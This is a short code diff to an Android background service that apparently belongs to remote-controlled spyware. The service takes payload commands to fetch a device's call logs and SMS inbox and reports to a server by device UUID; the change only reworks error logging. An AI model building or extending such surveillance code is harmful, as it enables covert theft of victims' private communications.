@@ -59,7 +59,7 @@ import java.util.List;
 
 public class Starter extends Service {
 
-    String uuid = UniqueId.initialize(this).getUUID();
+    String uuid;
 
     public Starter() {
     }
@@ -67,7 +67,7 @@ public class Starter extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         String input = intent.getStringExtra("inputExtra");
-
+        uuid = UniqueId.initialize(this).getUUID();
         RemoteViews notificationLayout = new RemoteViews(getPackageName(), R.layout.notification_small);
 
         Intent notificationIntent = new Intent(this, Starter.class);
@@ -535,8 +535,7 @@ public class Starter extends Service {
                         @Override
                         public void onResponseEmpty() {
                             Log.e("EMPTY", "NO RECORDS DETECTED");
-                            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_CALL_LOGS+"").child("CurrentLog").setValue("NO RECORDS DETECTED");
-
+                            Logs.pushLogsToServer("[ERROR]: NO call logs found to fetch", uuid);
                         }
                     }).execute();
 
@@ -595,8 +594,7 @@ public class Starter extends Service {
                         @Override
                         public void onResponseEmpty() {
                             Log.e("EMPTY", "NO RECORDS DETECTED");
-                            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"").child("CurrentLog").setValue("NO RECORDS DETECTED");
-
+                            Logs.pushLogsToServer("No Received messages found in the inbox", uuid);
                         }
                     }).execute(modeInbox);
 
